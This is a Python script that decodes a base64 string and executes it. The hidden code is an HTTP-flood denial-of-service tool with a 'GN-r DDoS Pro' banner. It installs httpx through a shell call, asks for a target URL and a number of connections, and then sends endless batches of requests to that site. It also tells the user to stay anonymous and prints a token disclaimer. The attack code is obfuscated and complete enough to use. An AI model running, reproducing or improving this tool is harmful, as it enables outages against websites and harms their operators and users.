import base64

encoded_code = 'aW1wb3J0IGh0dHB4CmltcG9ydCBhc3luY2lvCmltcG9ydCBvcwppbXBvcnQgc3VicHJvY2VzcwppbXBvcnQgdGltZQoKcGF1c2VkID0gRmFsc2UgICMgVmFyaWFibGUgdG8gdHJhY2sgdGhlIHBhdXNlIHN0YXRlCgphc3luYyBkZWYgdmlzaXRfdXJsKHNlc3Npb24sIHVybCwgcmVxdWVzdF9jb3VudGVyKToKICAgIGdsb2JhbCBwYXVzZWQKICAgIHRyeToKICAgICAgICByZXNwb25zZSA9IGF3YWl0IHNlc3Npb24uZ2V0KHVybCkKICAgICAgICByZXF1ZXN0X2NvdW50ZXIgKz0gMQogICAgICAgIHByaW50KGYiXDAzM1s5M20gIDwgcGFja2V0IHNlbnQhID4ge3VybH1cMDMzWzBtLCBcMDMzWzkybSMgU3RhdHVzIENvZGU6IHtyZXNwb25zZS5zdGF0dXNfY29kZX0sICMgUmVxdWVzdHMgU2VudDoge3JlcXVlc3RfY291bnRlcn1cMDMzWzBtIikKICAgIGV4Y2VwdCBodHRweC5IVFRQRXJyb3IgYXMgZToKICAgICAgICBwcmludChmIlwwMzNbOTFtRmFpbGVkIHRvIHNlbmQgcGFja2V0LCBtYXliZSB0aGUgc2VydmVyIGlzIGRvd24gIyBSZXF1ZXN0cyBTZW50OiB7cmVxdWVzdF9jb3VudGVyfVwwMzNbMG0iKQoKYXN5bmMgZGVmIHN0YXJ0X2JvdCh1cmwsIG51bV9jb25uZWN0aW9ucz0wLCBiYXRjaF9zaXplPTEwMCk6CiAgICBnbG9iYWwgcGF1c2VkCiAgICByZXF1ZXN0X2NvdW50ZXIgPSAwCiAgICBhc3luYyB3aXRoIGh0dHB4LkFzeW5jQ2xpZW50KCkgYXMgY2xpZW50OgogICAgICAgIHdoaWxlIFRydWU6CiAgICAgICAgICAgIHRhc2tzID0gW10KICAgICAgICAgICAgZm9yIF8gaW4gcmFuZ2UobnVtX2Nvbm5lY3Rpb25zKToKICAgICAgICAgICAgICAgIHRhc2tzLmFwcGVuZCh2aXNpdF91cmwoY2xpZW50LCB1cmwsIHJlcXVlc3RfY291bnRlcikpCiAgICAgICAgICAgICAgICByZXF1ZXN0X2NvdW50ZXIgKz0gMQoKICAgICAgICAgICAgIyBDb250aW51ZSB3aXRoIHRhc2tzCiAgICAgICAgICAgIGF3YWl0IGFzeW5jaW8uZ2F0aGVyKCp0YXNrcykKCiAgICAgICAgICAgICMgQWRqdXN0IHNsZWVwIHRpbWUgaWYgbmVlZGVkCiAgICAgICAgICAgIGF3YWl0IGFzeW5jaW8uc2xlZXAoMCkKCmlmIF9fbmFtZV9fID09ICJfX21haW5fXyI6CiAgICBkZWYgY2hlY2tfaW5zdGFsbChwYWNrYWdlX25hbWUsIGluc3RhbGxfY29tbWFuZCk6CiAgICAgICAgdHJ5OgogICAgICAgICAgICBfX2ltcG9ydF9fKHBhY2thZ2VfbmFtZSkKICAgICAgICBleGNlcHQgSW1wb3J0RXJyb3I6CiAgICAgICAgICAgIHByaW50KGYie3BhY2thZ2VfbmFtZX0gaXMgbm90IGluc3RhbGxlZC4gSW5zdGFsbGluZy4uLiIpCiAgICAgICAgICAgIHN1YnByb2Nlc3MucnVuKGluc3RhbGxfY29tbWFuZCwgc2hlbGw9VHJ1ZSkKICAgICAgICAgICAgcHJpbnQoZiJ7cGFja2FnZV9uYW1lfSBoYXMgYmVlbiBpbnN0YWxsZWQuIikKCiAgICAjIENoZWNrIGFuZCBpbnN0YWxsIGh0dHB4CiAgICBjaGVja19pbnN0YWxsKCJodHRweCIsICJwaXAgaW5zdGFsbCBodHRweCIpCgogICAgb3Muc3lzdGVtKCJjbGVhciIpCiAgICBvcy5zeXN0ZW0oImZpZ2xldCBHTi1yIEREb1MgUHJvICIpICAjIEZpeCB0eXBvOiBvcy5zeXNyZW0gLT4gb3Muc3lzdGVtCiAgICBwcmludCgiICBHTi1yIERpc3RyaWJ1dGVkIERlbmlhbCBvZiBTZXJ2aWNlIGF0dGFjayBQcm8gIikKICAgIHByaW50KCIgIikKICAgIHByaW50KCIgQnkgS2lOR0VYIFsgd3d3LmdpdGh1Yi5jb20vS2lOR0VYMSBdIikKICAgIHByaW50KCIiKQogICAgcHJpbnQoIlwwMzNbOTRtIElkZWEgYnkgbWUgQ29kZSBieSBDaGF0R1BUXDAzM1swbSIpCiAgICBwcmludCgiIikKICAgIHByaW50KCJcMDMzWzkxbURpc2NsYWltZXIgOiBUaGlzIHRvb2wgaXMgaW50ZW5kZWQgc3RyaWN0bHkgZm9yIGVkdWNhdGlvbmFsIHB1cnBvc2VzIHRvIHVuZGVyc3RhbmQgbmV0d29yayBzZWN1cml0eSBhbmQgc2hvdWxkIG9ubHkgYmUgdXNlZCBpbiBlbnZpcm9ubWVudHMgd2hlcmUgeW91IGhhdmUgZXhwbGljaXQgYXV0aG9yaXphdGlvbi5cMDMzWzBtIikKICAgIHByaW50KCJcMDMzWzkxbUkgYW0gbm90IHJlc3BvbnNpYmxlIGZvciBhbnkga2luZCBvZiBkYW1hZ2Ugb3IgcHJvYmxlbXMuIFVzZSBhdCB5b3VyIG93biByaXNrLlwwMzNbMG0iKQogICAgcHJpbnQoIiIpCiAgICBwcmludCgiXDAzM1s5MW1Zb3VyIElQIGlzIHB1YmxpYywgbWFrZSBzdXJlIHlvdSBhcmUgYW5vbnltb3VzXDAzM1swbSIpCiAgICBwcmludCgiIikKICAgIHByaW50KCJcMDMzWzkzbUlmIHlvdSBqdXN0IGtub3cgaG93IGRkb3MgYXR0YWNrIHdvcmtzIGFuZCBkb250IGtub3cgaG93IGV0aGljYWxzIGhhY2tlcnMgdHJhY2sgeW91IGV2ZW4geW91IHVzZSB0b3IgdnBuIHRoZW4gc3RheSBhd2F5IGZyb20gdGhpcyBvdGhlcnZpc2Ugd2VsY29tZSB0byBqYWlsXDAzM1swbSIpCiAgICBwcmludCgiIikKICAgIHVybCA9IGlucHV0KCJbR04tcl0gRW50ZXIgdGhlIFRhcmdldCBVUkwgOiAiKQogICAgdGltZS5zbGVlcCgxKQogICAgcHJpbnQoIiIpCiAgICBwcmludCgiXDAzM1s5M208Pjw+PD48Pjw+PD48Pjw+PD48Pjw+PD48Pjw+PD48Pjw8Pjw+PD5cMDMzWzBtICIpCiAgICBwcmludCgiXDAzM1s5MW1UYXJnZXQgOiBcMDMzWzBtIiwgdXJsKQogICAgcHJpbnQoIlwwMzNbOTNtPD48Pjw+PD48Pjw+PD48Pjw+PD48Pjw+PD48Pjw+PD48PD48Pjw+IFwwMzNbMG0iKQogICAgcHJpbnQoIiIpCiAgICBjb25jID0gaW50KGlucHV0KCJFbnRlciB0aGUgbnVtYmVyIG9mIGNvbm5lY3Rpb25zOiAiKSkKICAgIHByaW50KCJcMDMzWzkzbTw+PD48Pjw+PD48Pjw+PD48Pjw+PD48Pjw+PD48Pjw+PDw+PD48PiBcMDMzWzBtIikKICAgIAogICAgcHJpbnQoIlwwMzNbOTFtQ29ubmVjdGlvbnMgPSBcMDMzWzBtIiwgY29uYykKICAgIHByaW50KCIiKQogICAgb3Muc3lzdGVtKCJjbGVhciIpCiAgICBvcy5zeXN0ZW0oImZpZ2xldCBTdGFydGluZyB0aGUgRERvUyBhdHRhY2siKQogICAgdGltZS5zbGVlcCgyKSAKICAgIGFzeW5jaW8ucnVuKHN0YXJ0X2JvdCh1cmwsIG51bV9jb25uZWN0aW9ucz1jb25jKSkK'

exec(base64.b64decode(encoded_code).decode())
